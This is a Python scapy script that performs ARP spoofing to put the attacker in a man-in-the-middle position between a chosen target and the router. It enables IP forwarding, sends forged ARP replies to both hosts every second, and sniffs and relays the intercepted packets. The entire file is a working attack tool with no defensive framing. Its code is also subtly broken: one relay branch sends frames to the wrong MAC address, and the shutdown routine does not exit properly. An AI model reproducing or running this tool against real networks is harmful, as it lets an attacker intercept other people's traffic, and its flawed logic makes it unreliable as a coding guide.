#The objective of this code is make a man in the middle position. It use scapy library to craft arp packets to poisoning the arp table of one target and recieve
#the incoming traffic.

#!/bin/python3

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import time
import threading
import sys

ip_target = input('INFORME O IP DO ALVO: ')
ip_router = input('INFORME O IP DO ROTEADOR: ')
mac_router = getmacbyip(ip_router)
mac_attacker = get_if_hwaddr('eth0')

def main():
    global mac_target
    
    forward()
    pkt_discover = sr1(ARP(pdst=ip_target),verbose=0)
    mac_target = pkt_discover.hwsrc
    print (f"[DEBUG] Mac alvo: {mac_target}")
    print (f'[DEBUG] MAC atacante: {mac_attacker}')
    print (f'[DEBUG] MAC roteador: {mac_router}')
    
    arp_spoof = threading.Thread(target=(arp_poison),args=(mac_target,mac_attacker))
    print('[DEBUG] Iniciando ARP spoof...')
    arp_spoof.start()
    sniffer()

def sniffer():
    print("[DEBUG] Iniciando sniffer...")
    sniff(iface='eth0',store=0,prn=pkt_forward)

def arp_poison(mac_target,mac_attacker):
    poison_victim = Ether(dst=mac_target)/ARP(hwdst=mac_target,hwsrc=mac_attacker,psrc=ip_router,pdst=ip_target,op=2)
    poison_router = Ether(dst=mac_router)/ARP(hwdst=mac_router,hwsrc=mac_attacker,psrc=ip_target,pdst=ip_router,op=2)
    while True:
        try:
            sendp(poison_victim, iface='eth0', verbose=0)
            sendp(poison_router, iface='eth0', verbose=0)
            time.sleep(1)
        except KeyboardInterrupt:
            close()

def pkt_forward(pkt):
    try:
        if pkt[Ether].src == mac_target:
            print ('[INFO] Pacote: alvo -> Roteador')
            pkt[Ether].dst = mac_router
            pkt[Ether].src = mac_attacker
            sendp(pkt, iface='eth0', verbose =0)
        elif pkt[Ether].src == mac_router:
            print("[INFO] Pacote: Roteador -> Alvo")
            pkt[Ether].src = mac_attacker
            pkt[Ether].dst = mac_router
            sendp(pkt,iface='eth0',verbose=0)
    except Exception as e:
        print('[ERRO] Falha ao redirecionar o pacote.')

def forward():
    print('[DEBUG] Habilitanto encaminamento de IP.')
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

def dis_forward():
    print('[DEBUG] Desabilitando emcaminhamento IP...')
    os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')

def close():
    send(ARP(op=2,pdst=ip_router,psrc=ip_target,hwdst='ff:ff:ff:ff:ff:ff',hwsrc=mac_router), count=2)
    send(ARP(op=2,pdst=ip_target,psrc=ip_router,hwdst='ff:ff:ff:ff:ff:ff',hwsrc=mac_target), count=2)
    dis_forward()
    print('[DEBUG] Finalizando programa...')
    exit
    
if __name__ == '__main__':
    main()
